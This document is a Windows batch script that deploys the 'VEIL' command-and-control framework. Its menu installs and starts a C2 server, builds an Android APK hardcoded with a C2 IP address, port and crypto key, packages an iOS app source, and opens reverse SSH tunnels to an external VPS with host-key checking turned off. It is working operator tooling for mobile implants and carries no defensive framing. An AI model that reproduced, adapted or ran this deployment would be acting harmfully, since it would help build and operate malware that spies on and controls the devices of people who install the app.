@echo off
title VEIL C2 Deployment Wizard
color 0a
setlocal EnableDelayedExpansion
echo  =========================================================
echo             VEIL C2 - Deployment Wizard v3.1
echo  =========================================================
net session >nul 2>&1
if %errorlevel% neq 0 ( echo  [!] Administrator privileges required. & pause & exit /b 1 )
set "GRADLE_HOME=C:\Users\Alireza\Desktop\gradle-8.14.3"
set "JAVA_HOME=D:\Android Studio\jbr"
set "OUTPUT_DIR=%USERPROFILE%\Desktop"
:menu
echo  [1] Full Server Deploy
echo  [2] Build APK Only
echo  [3] Start C2 Server
echo  [4] Package iOS Source
echo  [5] Setup SSH Tunnel
echo  [6] Full Deploy + VPS Tunnel
echo  [7] Exit
set /p choice="Choice: "
if "%choice%"=="1" goto full_deploy
if "%choice%"=="2" goto build_apk
if "%choice%"=="3" goto start_server
if "%choice%"=="4" goto package_ios
if "%choice%"=="5" goto setup_tunnel
if "%choice%"=="6" goto full_deploy_vps
if "%choice%"=="7" exit
goto menu
:setup_tunnel
ssh -i "%USERPROFILE%\Desktop\Oracle VMS\England\ssh-key-2026-05-31 (3).key" -o StrictHostKeyChecking=no -N -R 8220:127.0.0.1:8220 -R 8230:127.0.0.1:8230 ubuntu@152.67.155.202
goto menu
:full_deploy
pushd server
if not exist ".env" copy .env.example .env >nul 2>&1
call npm install --silent
popd
:build_apk
pushd android
"%GRADLE_HOME%\bin\gradle.bat" assembleRelease -Pc2_host=152.67.155.202 -Pc2_port=8230 -Pcrypto_key="v3ilm4sk2024veil" -Penroll_key="changeme"
popd
set "APK_SRC=android\app\build\outputs\apk\release\app-release.apk"
if exist "%APK_SRC%" ( echo  [+] APK built & copy /y "%APK_SRC%" "%OUTPUT_DIR%\veil.apk" >nul )
goto menu
:package_ios
if exist "ios\VeilApp" ( powershell -NoProfile -Command "Compress-Archive -Path 'ios\VeilApp' -DestinationPath '%OUTPUT_DIR%\VeilApp_iOS.zip' -Force" )
goto menu
:start_server
pushd server
start "VEIL C2 Server" cmd /c "node server.js & pause"
popd
goto menu
:full_deploy_vps
call :full_deploy
start "VEIL SSH Tunnel" cmd /c "ssh -i \"%USERPROFILE%\Desktop\Oracle VMS\England\ssh-key-2026-05-31 (3).key\" -o StrictHostKeyChecking=no -N -R 8220:127.0.0.1:8220 -R 8230:127.0.0.1:8230 ubuntu@152.67.155.202"
goto menu
